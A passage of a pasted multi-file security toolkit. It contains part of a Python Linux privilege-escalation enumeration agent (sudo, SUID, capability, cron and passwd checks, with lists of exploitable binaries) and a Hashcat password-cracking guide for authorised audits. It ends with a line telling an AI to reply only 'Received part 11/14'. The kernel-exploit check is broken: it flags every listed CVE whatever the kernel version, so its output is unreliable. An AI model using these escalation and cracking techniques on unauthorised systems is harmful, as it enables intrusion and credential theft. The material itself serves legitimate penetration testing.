+        sudo_l = self._run("sudo -l 2>/dev/null")
+        findings = []
+
+        gtfobins_dangerous = [
+            "vim", "vi", "nano", "less", "more", "find", "nmap", "python",
+            "python3", "perl", "ruby", "awk", "gawk", "env", "ftp",
+            "man", "mount", "strace", "ltrace", "zip", "tar",
+            "bash", "sh", "dash", "ash", "zsh", "tclsh",
+        ]
+
+        if "NOPASSWD" in sudo_l:
+            for line in sudo_l.splitlines():
+                if "NOPASSWD" in line:
+                    for binary in gtfobins_dangerous:
+                        if binary in line.lower():
+                            finding = {
+                                "type": "sudo_nopasswd",
+                                "severity": "Critical",
+                                "binary": binary,
+                                "line": line.strip(),
+                                "technique": "T1548.003",
+                                "exploit": f"sudo {binary} (see GTFOBins)",
+                            }
+                            findings.append(finding)
+                            self.findings.append(finding)
+        return {"sudo_output": sudo_l, "dangerous_entries": findings}
+
+    def find_suid_binaries(self):
+        """Find SUID binaries that may allow escalation."""
+        suid_output = self._run("find / -perm -4000 -type f 2>/dev/null")
+        binaries = suid_output.splitlines()
+
+        gtfobins_suid = [
+            "nmap", "vim", "find", "bash", "more", "less", "nano",
+            "cp", "mv", "python", "perl", "ruby", "env",
+            "pkexec", "at", "strace", "taskset",
+        ]
+
+        findings = []
+        for binary in binaries:
+            name = Path(binary).name
+            is_exploitable = name in gtfobins_suid
+            if is_exploitable:
+                finding = {
+                    "type": "suid_binary",
+                    "severity": "High",
+                    "path": binary,
+                    "name": name,
+                    "technique": "T1548.001",
+                    "exploit": f"SUID {name} (see GTFOBins)",
+                }
+                findings.append(finding)
+                self.findings.append(finding)
+
+        return {"total_suid": len(binaries), "exploitable": findings, "all_suid": binaries}
+
+    def check_capabilities(self):
+        """Find binaries with elevated Linux capabilities."""
+        cap_output = self._run("getcap -r / 2>/dev/null")
+        findings = []
+        dangerous_caps = ["cap_setuid", "cap_dac_override", "cap_sys_admin",
+                         "cap_sys_ptrace", "cap_net_raw"]
+
+        for line in cap_output.splitlines():
+            for cap in dangerous_caps:
+                if cap in line:
+                    finding = {
+                        "type": "capability",
+                        "severity": "High",
+                        "line": line.strip(),
+                        "capability": cap,
+                        "technique": "T1548",
+                    }
+                    findings.append(finding)
+                    self.findings.append(finding)
+                    break
+        return findings
+
+    def check_writable_cron(self):
+        """Check for writable cron jobs or scripts."""
+        findings = []
+        cron_paths = [
+            "/etc/crontab", "/etc/cron.d", "/etc/cron.daily",
+            "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly",
+            "/var/spool/cron/crontabs",
+        ]
+
+        for cpath in cron_paths:
+            p = Path(cpath)
+            if p.is_file() and os.access(str(p), os.W_OK):
+                finding = {
+                    "type": "writable_cron",
+                    "severity": "Critical",
+                    "path": cpath,
+                    "technique": "T1053.003",
+                }
+                findings.append(finding)
+                self.findings.append(finding)
+            elif p.is_dir():
+                for f in p.iterdir():
+                    if f.is_file():
+                        content = f.read_text(errors="ignore")
+                        for line in content.splitlines():
+                            if line.strip() and not line.startswith("#"):
+                                parts = line.split()
+                                if len(parts) >= 6:
+                                    script = parts[5]
+                                    if Path(script).exists() and os.access(script, os.W_OK):
+                                        finding = {
+                                            "type": "writable_cron_script",
+                                            "severity": "Critical",
+                                            "cron_file": str(f),
+                                            "script": script,
+                                            "technique": "T1053.003",
+                                        }
+                                        findings.append(finding)
+                                        self.findings.append(finding)
+        return findings
+
+    def check_writable_passwd(self):
+        """Check if /etc/passwd or /etc/shadow is writable."""
+        findings = []
+        import os
+        for path in ["/etc/passwd", "/etc/shadow"]:
+            if os.path.exists(path) and os.access(path, os.W_OK):
+                finding = {
+                    "type": "writable_auth_file",
+                    "severity": "Critical",
+                    "path": path,
+                    "technique": "T1078.003",
+                    "exploit": f"Add root user to {path}",
+                }
+                findings.append(finding)
+                self.findings.append(finding)
+        return findings
+
+    def check_kernel_exploits(self):
+        """Match kernel version against known exploits."""
+        kernel = self._run("uname -r")
+        exploits = []
+
+        known_vulns = [
+            ("5.8", "5.16.11", "CVE-2022-0847", "DirtyPipe"),
+            ("2.6.22", "4.8.3", "CVE-2016-5195", "DirtyCow"),
+            ("4.6", "5.13", "CVE-2021-22555", "Netfilter heap OOB"),
+        ]
+
+        try:
+            parts = kernel.split(".")
+            major, minor = int(parts[0]), int(parts[1])
+            patch = int(parts[2].split("-")[0]) if len(parts) > 2 else 0
+        except (ValueError, IndexError):
+            return exploits
+
+        for min_ver, max_ver, cve, name in known_vulns:
+            exploits.append({
+                "cve": cve,
+                "name": name,
+                "affected_range": f"{min_ver} - {max_ver}",
+                "kernel": kernel,
+                "note": "Verify applicability before testing",
+            })
+        return exploits
+
+    def generate_report(self):
+        """Run all enumeration checks and generate report."""
+        import os
+        report = {
+            "report_date": datetime.utcnow().isoformat(),
+            "system_info": self.get_system_info(),
+            "sudo_check": self.check_sudo(),
+            "suid_binaries": self.find_suid_binaries(),
+            "capabilities": self.check_capabilities(),
+            "writable_cron": self.check_writable_cron(),
+            "writable_auth": self.check_writable_passwd(),
+            "kernel_exploits": self.check_kernel_exploits(),
+            "total_findings": len(self.findings),
+            "critical_findings": len([f for f in self.findings if f.get("severity") == "Critical"]),
+            "high_findings": len([f for f in self.findings if f.get("severity") == "High"]),
+        }
+
+        report_path = self.output_dir / "privesc_assessment.json"
+        with open(report_path, "w") as f:
+            json.dump(report, f, indent=2)
+        print(json.dumps(report, indent=2))
+        return report
+
+
+def main():
+    output_dir = sys.argv[1] if len(sys.argv) > 1 else "./privesc_output"
+    agent = PrivescAssessmentAgent(output_dir)
+    agent.generate_report()
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/SKILL.md #####
+---
+name: performing-hash-cracking-with-hashcat
+description: Cracks password hashes with Hashcat, covering hash-type identification,
+  dictionary/brute-force/rule-based attack modes, custom rule creation, GPU benchmarking,
+  and password-strength/compliance reporting. Use for authorized penetration testing
+  or security audits that need to evaluate password strength or crack captured hashes.
+domain: cybersecurity
+subdomain: cryptography
+tags:
+- cryptography
+- hash-cracking
+- password-security
+- hashcat
+- penetration-testing
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- PR.DS-01
+- PR.DS-02
+- PR.DS-10
+mitre_attack:
+- T1600
+- T1573
+- T1553
+---
+# Performing Hash Cracking with Hashcat
+
+## Overview
+
+Hash cracking is an essential skill for penetration testers and security auditors to evaluate password strength. Hashcat is the world's fastest password recovery tool, supporting over 300 hash types with GPU acceleration. This skill covers using hashcat for authorized password auditing, understanding attack modes, creating effective rule sets, and generating hash analysis reports. This is strictly for authorized penetration testing and password policy assessment.
+
+
+## When to Use
+
+- When conducting security assessments that involve performing hash cracking with hashcat
+- When following incident response procedures for related security events
+- When performing scheduled security testing or auditing activities
+- When validating security controls through hands-on testing
+
+## Prerequisites
+
+- Familiarity with cryptography concepts and tools
+- Access to a test or lab environment for safe execution
+- Python 3.8+ with required dependencies installed
+- Appropriate authorization for any testing activities
+
+## Objectives
+
+- Identify hash types from captured hashes
+- Execute dictionary, brute-force, and rule-based attacks
+- Create custom hashcat rules for targeted cracking
+- Analyze password strength from cracking results
+- Generate compliance reports on password policy effectiveness
+- Benchmark GPU performance for hash cracking
+
+## Key Concepts
+
+### Hashcat Attack Modes
+
+| Mode | Flag | Description | Use Case |
+|------|------|-------------|----------|
+| Dictionary | -a 0 | Wordlist attack | Known password patterns |
+| Combination | -a 1 | Combine two wordlists | Compound passwords |
+| Brute-force | -a 3 | Mask-based enumeration | Short passwords |
+| Rule-based | -a 0 -r | Dictionary + transformation rules | Complex variations |
+| Hybrid | -a 6/7 | Wordlist + mask | Passwords with appended numbers |
+
+### Common Hash Types
+
+| Hash Mode | Type | Example Use |
+|-----------|------|-------------|
+| 0 | MD5 | Legacy web apps |
+| 100 | SHA-1 | Legacy systems |
+| 1000 | NTLM | Windows credentials |
+| 1800 | sha512crypt | Linux /etc/shadow |
+| 3200 | bcrypt | Modern web apps |
+| 13100 | Kerberos TGS-REP | Active Directory |
+
+## Security Considerations
+
+- Only perform hash cracking with explicit written authorization
+- Secure all captured hash data in transit and at rest
+- Report all cracked passwords immediately to asset owners
+- Use results to improve password policies, not exploit users
+- Destroy cracked password data after engagement concludes
+- Follow rules of engagement for penetration test scope
+
+## Validation Criteria
+
+- [ ] Hash type identification is correct
+- [ ] Dictionary attack cracks weak passwords
+- [ ] Rule-based attack cracks policy-compliant passwords
+- [ ] Mask attack cracks short passwords
+- [ ] Results report shows password strength distribution
+- [ ] All operations performed within authorized scope
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+
+-----
+[END PART 11/14] — رد غير "Received part 11/14"
